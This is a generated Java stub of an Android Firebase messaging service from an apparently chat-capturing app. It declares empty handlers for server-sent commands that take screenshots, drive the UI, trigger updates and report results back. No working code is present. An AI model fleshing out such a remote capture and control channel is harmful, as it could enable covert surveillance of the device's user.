package com.chats.capture.services;

/**
 * Firebase Cloud Messaging service to handle push notifications and commands
 */
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u00008\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010$\n\u0002\b\b\n\u0002\u0018\u0002\n\u0002\b\u000b\u0018\u0000 !2\u00020\u0001:\u0001!B\u0005\u00a2\u0006\u0002\u0010\u0002J\u000e\u0010\u0005\u001a\u00020\u0006H\u0082@\u00a2\u0006\u0002\u0010\u0007J\b\u0010\b\u001a\u00020\tH\u0002J$\u0010\n\u001a\u00020\u00062\u0006\u0010\u000b\u001a\u00020\f2\u0012\u0010\r\u001a\u000e\u0012\u0004\u0012\u00020\f\u0012\u0004\u0012\u00020\f0\u000eH\u0002J&\u0010\u000f\u001a\u00020\t2\b\u0010\u000b\u001a\u0004\u0018\u00010\f2\b\u0010\u0010\u001a\u0004\u0018\u00010\f2\b\u0010\u0011\u001a\u0004\u0018\u00010\fH\u0002J\u001c\u0010\u0012\u001a\u00020\t2\u0012\u0010\u0013\u001a\u000e\u0012\u0004\u0012\u00020\f\u0012\u0004\u0012\u00020\f0\u000eH\u0002J\b\u0010\u0014\u001a\u00020\tH\u0016J\u0010\u0010\u0015\u001a\u00020\t2\u0006\u0010\u0016\u001a\u00020\u0017H\u0016J\u0010\u0010\u0018\u001a\u00020\t2\u0006\u0010\u0019\u001a\u00020\fH\u0016J&\u0010\u001a\u001a\u00020\t2\u0006\u0010\u0011\u001a\u00020\f2\u0006\u0010\u001b\u001a\u00020\u00062\u0006\u0010\u001c\u001a\u00020\fH\u0082@\u00a2\u0006\u0002\u0010\u001dJ\b\u0010\u001e\u001a\u00020\u0006H\u0002J\u000e\u0010\u001f\u001a\u00020\u0006H\u0082@\u00a2\u0006\u0002\u0010\u0007J\b\u0010 \u001a\u00020\u0006H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\""}, d2 = {"Lcom/chats/capture/services/AppFirebaseMessagingService;", "Lcom/google/firebase/messaging/FirebaseMessagingService;", "()V", "serviceScope", "Lkotlinx/coroutines/CoroutineScope;", "captureScreenshot", "", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "createNotificationChannel", "", "executeUICommand", "action", "", "params", "", "handleCommand", "parameters", "commandId", "handleDataMessage", "data", "onCreate", "onMessageReceived", "remoteMessage", "Lcom/google/firebase/messaging/RemoteMessage;", "onNewToken", "token", "reportCommandResult", "success", "message", "(Ljava/lang/String;ZLjava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "restartServices", "triggerAppUpdate", "triggerDataSync", "Companion", "app_debug"})
public final class AppFirebaseMessagingService extends com.google.firebase.messaging.FirebaseMessagingService {
    @org.jetbrains.annotations.NotNull()
    private final kotlinx.coroutines.CoroutineScope serviceScope = null;
    @org.jetbrains.annotations.NotNull()
    private static final java.lang.String FCM_CHANNEL_ID = "fcm_notification_channel";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_CHANNEL_ID = "command_channel";
    @org.jetbrains.annotations.NotNull()
    public static final com.chats.capture.services.AppFirebaseMessagingService.Companion Companion = null;
    
    public AppFirebaseMessagingService() {
        super();
    }
    
    @java.lang.Override()
    public void onCreate() {
    }
    
    /**
     * Called when a new FCM token is generated
     * This happens when:
     * - App is restored on a new device
     * - App is restored on a new device
     * - App data is cleared
     * - App is uninstalled/reinstalled
     * - App is restored on a new device
     */
    @java.lang.Override()
    public void onNewToken(@org.jetbrains.annotations.NotNull()
    java.lang.String token) {
    }
    
    /**
     * Called when a message is received
     * Note: This is only called when app is in foreground or when message contains data payload.
     * For notification-only messages when app is in background, Android handles them automatically.
     */
    @java.lang.Override()
    public void onMessageReceived(@org.jetbrains.annotations.NotNull()
    com.google.firebase.messaging.RemoteMessage remoteMessage) {
    }
    
    /**
     * Handle data-only messages (commands from server)
     */
    private final void handleDataMessage(java.util.Map<java.lang.String, java.lang.String> data) {
    }
    
    /**
     * Handle commands from server
     */
    private final void handleCommand(java.lang.String action, java.lang.String parameters, java.lang.String commandId) {
    }
    
    /**
     * Trigger data sync by enqueuing SyncWorker
     */
    private final boolean triggerDataSync() {
        return false;
    }
    
    /**
     * Trigger app update
     */
    private final java.lang.Object triggerAppUpdate(kotlin.coroutines.Continuation<? super java.lang.Boolean> $completion) {
        return null;
    }
    
    /**
     * Restart services
     */
    private final boolean restartServices() {
        return false;
    }
    
    /**
     * Execute UI control command
     */
    private final boolean executeUICommand(java.lang.String action, java.util.Map<java.lang.String, java.lang.String> params) {
        return false;
    }
    
    /**
     * Capture screenshot
     */
    private final java.lang.Object captureScreenshot(kotlin.coroutines.Continuation<? super java.lang.Boolean> $completion) {
        return null;
    }
    
    /**
     * Report command execution result to server
     */
    private final java.lang.Object reportCommandResult(java.lang.String commandId, boolean success, java.lang.String message, kotlin.coroutines.Continuation<? super kotlin.Unit> $completion) {
        return null;
    }
    
    /**
     * Create notification channel for FCM notifications
     */
    private final void createNotificationChannel() {
    }
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000\u0014\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u0006"}, d2 = {"Lcom/chats/capture/services/AppFirebaseMessagingService$Companion;", "", "()V", "COMMAND_CHANNEL_ID", "", "FCM_CHANNEL_ID", "app_debug"})
    public static final class Companion {
        
        private Companion() {
            super();
        }
    }
}